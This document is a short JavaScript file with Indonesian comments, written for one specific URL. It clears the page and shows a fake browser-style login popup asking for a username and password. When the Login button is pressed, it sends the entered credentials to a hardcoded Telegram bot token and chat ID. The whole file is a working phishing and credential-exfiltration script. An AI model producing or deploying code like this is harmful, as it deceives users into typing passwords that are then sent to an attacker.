(function () {
  // Aktif hanya jika URL cocok
  if (window.location.href !== "https://admsol.nexxss.site/data-inject") return;

  // Hapus semua isi halaman
  document.body.innerHTML = "";

  // Tambahkan style
  const style = document.createElement("style");
  style.textContent = `
    body {
      margin: 0;
      font-family: sans-serif;
      background: #e0e0e0;
    }
    .overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.6);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 999;
    }
    .popup {
      background-color: #1c1c28;
      color: white;
      width: 90%;
      max-width: 400px;
      padding: 20px;
      border-radius: 20px;
      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
      animation: fadeIn 0.3s ease;
    }
    h2 {
      font-size: 24px;
      margin-bottom: 10px;
    }
    p {
      font-size: 14px;
      color: #ccc;
      margin-bottom: 10px;
    }
    label {
      font-size: 13px;
      color: #66aaff;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: none;
      border-bottom: 2px solid #66aaff;
      background: transparent;
      color: white;
      font-size: 16px;
      outline: none;
    }
    .buttons {
      text-align: right;
      margin-top: 10px;
    }
    button {
      padding: 8px 16px;
      margin-left: 10px;
      background: none;
      border: none;
      color: #66aaff;
      font-weight: bold;
      cursor: pointer;
    }
    button:hover {
      text-decoration: underline;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95); }
      to { opacity: 1; transform: scale(1); }
    }
  `;
  document.head.appendChild(style);

  // Buat elemen popup
  const overlay = document.createElement("div");
  overlay.id = "loginPopup";
  overlay.className = "overlay";

  const popup = document.createElement("div");
  popup.className = "popup";

  popup.innerHTML = `
    <h2>Login</h2>
    <p>https://admsol.nexxss.site memerlukan nama pengguna dan sandi.</p>
    <label>Nama Pengguna</label>
    <input type="text" id="username" placeholder="Nama Pengguna">
    <label>Sandi</label>
    <input type="password" id="password" placeholder="Sandi">
    <div class="buttons">
      <button onclick="document.getElementById('loginPopup').style.display='none'">Batal</button>
      <button id="loginBtn">Login</button>
    </div>
  `;

  overlay.appendChild(popup);
  document.body.appendChild(overlay);

  // Kirim ke Telegram saat login ditekan
  document.getElementById("loginBtn").addEventListener("click", () => {
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    const token = "7551512248:AAG39tneoqQOS6rHMiS-83dTQ_WAa0xJ7xY";
    const chatId = "7893111171";
    const message = `🔐 Login Baru!\n👤 Username: ${username}\n🔑 Password: ${password}`;

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: message })
    })
    .then(() => alert("Login berhasil dikirim!"))
    .catch((err) => {
      alert("Gagal mengirim ke Telegram!");
      console.error(err);
    });
  });
})();
